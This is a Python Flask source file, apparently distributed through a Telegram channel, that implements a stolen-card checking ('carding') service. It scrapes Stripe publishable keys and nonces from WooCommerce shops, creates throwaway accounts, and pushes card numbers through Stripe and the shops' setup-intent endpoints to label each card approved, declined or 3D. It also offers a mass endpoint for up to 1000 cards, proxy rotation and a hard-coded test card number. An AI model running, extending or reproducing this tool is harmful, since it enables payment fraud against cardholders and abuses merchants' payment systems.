from flask import Flask, jsonify, render_template_string, request
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import os
import logging
from datetime import timedelta
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
app = Flask(__name__)
app.secret_key = os.urandom(24)
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔

app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
app.config['SESSION_REFRESH_EACH_REQUEST'] = True
app.config['DEBUG'] = False
app.config['TESTING'] = False

# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
TEST_CARD = "4031630422575208|01|2030|280"
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
INDEX_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AFUONA API</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0f;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        /* خلفية نجوم متحركة */
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(2px 2px at 10px 10px, #fff, rgba(0,0,0,0)),
                        radial-gradient(2px 2px at 30px 40px, #4da6ff, rgba(0,0,0,0)),
                        radial-gradient(2px 2px at 70px 80px, #fff, rgba(0,0,0,0)),
                        radial-gradient(2px 2px at 100px 120px, #6ab0ff, rgba(0,0,0,0));
            background-size: 200px 200px;
            opacity: 0.3;
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 10;
            text-align: center;
            padding: 20px;
        }

        .logo {
            font-size: 4rem;
            font-weight: bold;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #00BFFF, #1E90FF);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0,191,255,0.5);
        }

        .name {
            font-size: 2.5rem;
            margin-bottom: 30px;
            color: #b0e0ff;
            text-shadow: 0 0 15px #4da6ff;
            letter-spacing: 3px;
        }

        .telegram-link {
            display: inline-flex;
            align-items: center;
            gap: 15px;
            background: rgba(0,191,255,0.1);
            border: 2px solid #00BFFF;
            border-radius: 50px;
            padding: 15px 40px;
            font-size: 1.5rem;
            color: #00BFFF;
            text-decoration: none;
            transition: all 0.3s;
            margin-top: 20px;
        }

        .telegram-link:hover {
            background: #00BFFF;
            color: #0a0a0f;
            transform: scale(1.05);
            box-shadow: 0 0 30px #00BFFF;
        }

        .telegram-icon {
            width: 30px;
            height: 30px;
            fill: currentColor;
        }

        .footer {
            margin-top: 60px;
            color: #3a5a68;
            font-size: 0.9rem;
        }

        @keyframes glow {
            from { text-shadow: 0 0 10px #4da6ff; }
            to { text-shadow: 0 0 30px #00BFFF; }
        }
    </style>
</head>
<body>
    <div class="stars"></div>
    <div class="container">
        <div class="logo">𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔</div>
        <div class="name">𝗔𝗣𝗜</div>
        
        <a href="https://t.me/afuonax" target="_blank" class="telegram-link">
            <svg class="telegram-icon" viewBox="0 0 24 24">
                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.287-.6.287l.21-3.07 5.58-5.05c.24-.21-.054-.33-.37-.12l-6.9 4.35-2.97-.99c-.64-.2-.66-.64.14-.96l11.64-4.47c.54-.2 1.01.13.83.96z"/>
            </svg>
        </a>
        
        <div class="footer">© 2026 AFUONA</div>
    </div>
</body>
</html>
"""

# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔 
@app.route('/')
def home():
    return render_template_string(INDEX_TEMPLATE)
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/process')
def process_request():
    try:
        key = request.args.get('key')
        domain = request.args.get('site')
        cc = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        
        logger.debug(f"Process request: key={key}, domain={domain}, cc={cc}, proxy={proxy_str}")
        
        if key != "afuona_2026":
            return jsonify({"error": "Invalid API key"}), 401
        
        if not domain:
            return jsonify({"error": "Missing domain"}), 400
        
        if not cc:
            return jsonify({"error": "Missing card"}), 400
        
        if not proxy_str:
            return jsonify({"error": "Proxy is REQUIRED"}), 400
        
        domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
        
        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV"}), 400
        
        proxy_dict = parse_proxy_format(proxy_str)
        if not proxy_dict:
            return jsonify({"error": "Invalid proxy format"}), 400
        
        result = process_card_enhanced(domain, cc, proxy_dict=proxy_dict)
        
        return jsonify({
            "Response": result.get("Response", "Unknown"),
            "Status": result.get("Status", "Unknown")
        })
        
    except Exception as e:
        logger.error(f"Process request error: {e}")
        return jsonify({"error": str(e)}), 500
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
def parse_proxy_format(proxy):
    """Parse all proxy formats"""
    import re
    
    proxy = proxy.strip()
    proxy_type = 'http'
    
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    
    host = ''
    port = ''
    username = ''
    password = ''
    
    match = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None
    
    if not host or not port:
        return None
    
    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'
    
    return {
        'http': proxy_url,
        'https': proxy_url
    }

def test_proxy(proxy_dict):
    """Test if proxy is working"""
    try:
        response = requests.get(
            'https://api.ipify.org?format=json',
            proxies=proxy_dict,
            timeout=10,
            verify=False
        )
        if response.status_code == 200:
            ip_data = response.json()
            return True, ip_data.get('ip')
        return False, None
    except Exception as e:
        return False, str(e)

def get_stripe_key(domain, proxy_dict=None):
    logger.debug(f"Getting Stripe key for domain: {domain}")
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params"
    ]
    
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
    ]
    
    for url in urls_to_try:
        try:
            logger.debug(f"Trying URL: {url}")
            response = requests.get(
                url, 
                headers={'User-Agent': UserAgent().random}, 
                timeout=10, 
                verify=False,
                proxies=proxy_dict
            )
            if response.status_code == 200:
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:                
                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                        if key_match:
                            logger.debug(f"Found Stripe key: {key_match.group(0)}")
                            return key_match.group(0)
        except Exception as e:
            logger.error(f"Error getting Stripe key from {url}: {e}")
            continue
    
    logger.debug("No Stripe key found - site might be dead")
    return None

def extract_nonce_from_page(html_content, domain):
    logger.debug(f"Extracting nonce from {domain}")
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            logger.debug(f"Found nonce: {match.group(1)}")
            return match.group(1)
    
    logger.debug("No nonce found")
    return None

def generate_random_credentials():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, email, password

def register_account(domain, session, proxy_dict=None):
    logger.debug(f"Registering account on {domain}")
    try:        
        reg_response = session.get(
            f"https://{domain}/my-account/", 
            verify=False,
            proxies=proxy_dict
        )
                
        reg_nonce_patterns = [
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
        ]
        
        reg_nonce = None
        for pattern in reg_nonce_patterns:
            match = re.search(pattern, reg_response.text)
            if match:
                reg_nonce = match.group(1)
                break
        
        if not reg_nonce:
            logger.debug("Could not extract registration nonce")
            return False, "Could not extract registration nonce"
                
        username, email, password = generate_random_credentials()
        
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        reg_result = session.post(
            f"https://{domain}/my-account/",
            data=reg_data,
            headers={'Referer': f'https://{domain}/my-account/'},
            verify=False,
            proxies=proxy_dict
        )
        
        if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
            logger.debug("Registration successful")
            return True, "Registration successful"
        else:
            logger.debug("Registration failed")
            return False, "Registration failed"
            
    except Exception as e:
        logger.error(f"Registration error: {e}")
        return False, f"Registration error: {str(e)}"

def process_card_enhanced(domain, ccx, proxy_dict=None):
    """ORIGINAL FUNCTION - KEPT EXACTLY"""
    logger.debug(f"Processing card for domain: {domain}")
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        logger.error("Invalid card format")
        return {
            "Response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "Status": "Declined"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})

    stripe_key = get_stripe_key(domain, proxy_dict)
    if not stripe_key:
        return {
            "Response": "Site does not have Stripe integration",
            "Status": "Declined"
        }

    registered, reg_message = register_account(domain, session, proxy_dict)
        
    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]
    
    nonce = None
    for url in payment_urls:
        try:
            logger.debug(f"Trying to get nonce from: {url}")
            response = session.get(url, timeout=10, verify=False, proxies=proxy_dict)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except Exception as e:
            logger.error(f"Error getting nonce from {url}: {e}")
            continue
    
    if not nonce:
        logger.error("Failed to extract nonce from site")
        return {"Response": "Failed to extract nonce from site", "Status": "Declined"}

    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'billing_details[name]': 'Sahil Pro',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(int(time.time()) % 100000),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }

    try:
        logger.debug("Creating payment method")
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            },
            timeout=15,
            verify=False,
            proxies=proxy_dict
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            logger.error(f"Payment method error: {error_msg}")
            return {"Response": error_msg, "Status": "Declined"}

        payment_method_id = pm_data['id']
        logger.debug(f"Payment method created: {payment_method_id}")
    except Exception as e:
        logger.error(f"Payment Method Creation Failed: {e}")
        return {"Response": f"Payment Method Creation Failed: {str(e)}", "Status": "Declined"}
    
    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
    ]
    
    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
        }
    ]

    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                logger.debug(f"Trying endpoint: {endpoint['url']} with payload: {data_payload}")
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=data_payload,
                    timeout=15,
                    verify=False,
                    proxies=proxy_dict
                )
                                
                try:
                    setup_data = setup_response.json()
                    logger.debug(f"Setup response: {setup_data}")
                except:
                    setup_data = {'raw_response': setup_response.text}
                    logger.debug(f"Setup raw response: {setup_response.text}")
              
                if setup_data.get('success', False):
                    data_status = setup_data['data'].get('status')
                    if data_status == 'requires_action':
                        logger.debug("3D authentication required")
                        return {"Response": "3D", "Status": "Declined"}
                    elif data_status == 'succeeded':
                        logger.debug("Payment succeeded")
                        return {"Response": "Card Added ", "Status": "Approved"}
                    elif 'error' in setup_data['data']:
                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                        logger.error(f"Payment error: {error_msg}")
                        return {"Response": error_msg, "Status": "Declined"}

                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    logger.error(f"Payment error: {error_msg}")
                    return {"Response": error_msg, "Status": "Declined"}

                if setup_data.get('status') in ['succeeded', 'success']:
                    logger.debug("Payment succeeded")
                    return {"Response": "Card Added", "Status": "Approved"}

            except Exception as e:
                logger.error(f"Setup error: {e}")
                continue

    logger.error("All payment attempts failed")
    return {"Response": "All payment attempts failed", "Status": "Declined"}

def test_site_with_card(domain, proxy_dict):
    """Test site with hidden card"""
    try:
        stripe_key = get_stripe_key(domain, proxy_dict)
        if not stripe_key:
            return {
                "domain": domain,
                "working": False,
                "status": "NO_STRIPE",
                "response": "Site has no Stripe integration"
            }
        
        result = process_card_enhanced(domain, TEST_CARD, proxy_dict=proxy_dict)
        
        if result["Status"] == "Approved":
            return {
                "domain": domain,
                "working": True,
                "status": "LIVE",
                "response": result["Response"]
            }
        elif "insufficient" in result["Response"].lower():
            return {
                "domain": domain,
                "working": True,
                "status": "NO BALANCE",
                "response": result["Response"]
            }
        elif "3d" in result["Response"].lower() or "secure" in result["Response"].lower():
            return {
                "domain": domain,
                "working": True,
                "status": "3D",
                "response": result["Response"]
            }
        elif "declined" in result["Response"].lower():
            return {
                "domain": domain,
                "working": True,
                "status": "DECLINED",
                "response": result["Response"]
            }
        else:
            return {
                "domain": domain,
                "working": True,
                "status": "UNKNOWN",
                "response": result["Response"]
            }
            
    except Exception as e:
        return {
            "domain": domain,
            "working": False,
            "status": "DEAD",
            "response": str(e)
        }

# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/test_site')
def test_site_request():
    try:
        key = request.args.get('key')
        domain = request.args.get('site')
        proxy_str = request.args.get('proxy')
        
        if key != "afuona_2026":
            return jsonify({"error": "Invalid API key"}), 401
        
        if not domain:
            return jsonify({"error": "Missing domain"}), 400
        
        if not proxy_str:
            return jsonify({"error": "Proxy is REQUIRED"}), 400
        
        domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
        
        proxy_dict = parse_proxy_format(proxy_str)
        if not proxy_dict:
            return jsonify({"error": "Invalid proxy format"}), 400
        
        result = test_site_with_card(domain, proxy_dict)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Test site error: {e}")
        return jsonify({"error": str(e)}), 500
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/test_sites')
def test_sites_request():
    try:
        key = request.args.get('key')
        sites_param = request.args.get('sites')
        proxy_str = request.args.get('proxy')
        
        if key != "afuona_2026":
            return jsonify({"error": "Invalid API key"}), 401
        
        if not sites_param:
            return jsonify({"error": "Missing sites"}), 400
        
        if not proxy_str:
            return jsonify({"error": "Proxy is REQUIRED"}), 400
        
        domains = sites_param.split(',')[:50]
        
        proxy_dict = parse_proxy_format(proxy_str)
        if not proxy_dict:
            return jsonify({"error": "Invalid proxy format"}), 400
        
        results = []
        working_sites = []
        
        for domain in domains:
            domain = domain.strip()
            result = test_site_with_card(domain, proxy_dict)
            results.append(result)
            if result.get("working"):
                working_sites.append(result)
        
        selected = working_sites[0]["domain"] if working_sites else None
        
        return jsonify({
            "results": results,
            "selected": selected,
            "stats": {
                "total": len(results),
                "working": len(working_sites)
            }
        })
        
    except Exception as e:
        logger.error(f"Test sites error: {e}")
        return jsonify({"error": str(e)}), 500
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/mass')
def mass_request():
    try:
        key = request.args.get('key')
        domain = request.args.get('site')
        proxy_str = request.args.get('proxy')
        cards_param = request.args.get('cards')
        
        if key != "afuona_2026":
            return jsonify({"error": "Invalid API key"}), 401
        
        if not domain:
            return jsonify({"error": "Missing domain"}), 400
        
        if not cards_param:
            return jsonify({"error": "Missing cards"}), 400
        
        if not proxy_str:
            return jsonify({"error": "Proxy is REQUIRED"}), 400
        
        domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
        cards = cards_param.split(',')[:1000]
        
        proxy_dict = parse_proxy_format(proxy_str)
        if not proxy_dict:
            return jsonify({"error": "Invalid proxy format"}), 400
        
        results = []
        approved = 0
        declined = 0
        threed = 0
        
        for card in cards:
            card = card.strip()
            result = process_card_enhanced(domain, card, proxy_dict=proxy_dict)
            
            if result.get("Status") == "Approved":
                approved += 1
            elif "3d" in result.get("Response", "").lower() or "secure" in result.get("Response", "").lower():
                threed += 1
            else:
                declined += 1
            
            results.append({
                "card": card,
                "response": result.get("Response", "Unknown"),
                "status": result.get("Status", "Unknown")
            })
        
        return jsonify({
            "results": results,
            "stats": {
                "total": len(results),
                "approved": approved,
                "declined": declined,
                "threed": threed
            }
        })
        
    except Exception as e:
        logger.error(f"Mass request error: {e}")
        return jsonify({"error": str(e)}), 500
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/test_proxy')
def test_proxy_endpoint():
    proxy_str = request.args.get('proxy')
    
    if not proxy_str:
        return jsonify({"error": "Missing proxy parameter"}), 400
    
    proxy_dict = parse_proxy_format(proxy_str)
    if not proxy_dict:
        return jsonify({"error": "Invalid proxy format"}), 400
    
    is_working, result = test_proxy(proxy_dict)
    
    if is_working:
        return jsonify({
            "success": True,
            "ip": result,
            "proxy": proxy_str
        })
    else:
        return jsonify({
            "success": False,
            "error": f"Proxy test failed: {result}"
        }), 400
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.route('/health')
def health_check():
    return jsonify({"status": "healthy"}), 200
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found"}), 404
# JOIN TELEGRAM 
# Telegram: https://t.me/afuonax
# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    print(" AFUONA API -  Payment Gateway 🔥")
    print("=" * 60)
    print(f"🚀 Running on port: {port}")
    print(f"📱 Telegram: https://t.me/afuonax")
    print(f"👑 Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔")
    print(f"🔑 API Key: afuona_2026")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=False)